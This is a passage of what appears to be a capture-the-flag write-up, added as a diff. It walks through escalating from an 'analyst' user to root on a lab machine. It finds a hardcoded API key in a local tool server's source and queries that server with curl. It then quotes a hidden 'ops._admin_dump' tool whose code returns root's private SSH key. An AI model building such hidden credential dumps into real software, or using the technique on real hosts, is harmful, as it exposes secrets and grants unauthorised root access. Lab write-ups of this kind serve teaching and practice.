@@ -280,3 +280,90 @@ analyst@devhub:~$
 ```
 
 ## Analyst -> Root
+
+Enumerating the machine with our new user, we discover the file /opt/opsmcp/server.py. Inspecting this file we discover a secret key:
+
+#### Secret Key:
+
+```
+# API Key for authentication
+VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
+```
+
+Displaying connections using netstat reveals port 5000 is running locally:
+
+#### Running Netstat:
+
+```
+netstat -pant | grep 5000
+```
+
+#### Output:
+
+```
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
+```
+
+We will test this connection using curl, as shown below:
+
+#### Running cURL:
+
+```
+curl localhost:5000
+```
+
+#### Output:
+
+```
+{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
+```
+
+It tells us that authorisation is required, therefore we will retest our connection with the secret key we discovered in server.py:
+
+#### Running cURL with secret key:
+
+```
+curl localhost:5000/tools/list -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a'
+```
+
+#### Output:
+
+```
+{"count":4,"details":{"ops.check_disk":{"description":"Check disk usage","parameters":{}},"ops.list_services":{"description":"List running services","parameters":{}},"ops.system_status":{"description":"Get system status and health metrics","parameters":{}},"ops.view_logs":{"description":"View recent system logs","parameters":{"service":"string"}}},"tools":["ops.system_status","ops.list_services","ops.check_disk","ops.view_logs"]}
+```
+
+Closer inspection of server.py reveals hidden tools not available in the /tools/list function:
+
+```
+# Hidden tools (not in /tools/list but callable)
+HIDDEN_TOOLS = {
+    "ops._admin_dump": {
+        "description": "Emergency credential dump - INTERNAL ONLY",
+        "parameters": {"target": "string", "confirm": "boolean"}
+    },
+    "ops._debug_mode": {
+        "description": "Enable debug mode",
+        "parameters": {}
+    }
+}
+```
+
+The ops._admin_dump tool sounds interesting. Moreover, the code also says that if the target parameter is set to "ssh_keys" it will dump root's private SSH key:
+
+```
+if target == "ssh_keys":
+    try:
+        with open('/root/.ssh/id_rsa', 'r') as f:
+            key_data = f.read()
+        return jsonify({
+            "target": "ssh_keys",
+            "root_private_key": key_data,
+            "note": "Emergency recovery key dump"
+        })
+    except Exception as e:
+        return jsonify({
+            "target": "ssh_keys",
+            "error": f"Could not read key: {str(e)}"
+        })
+```
+
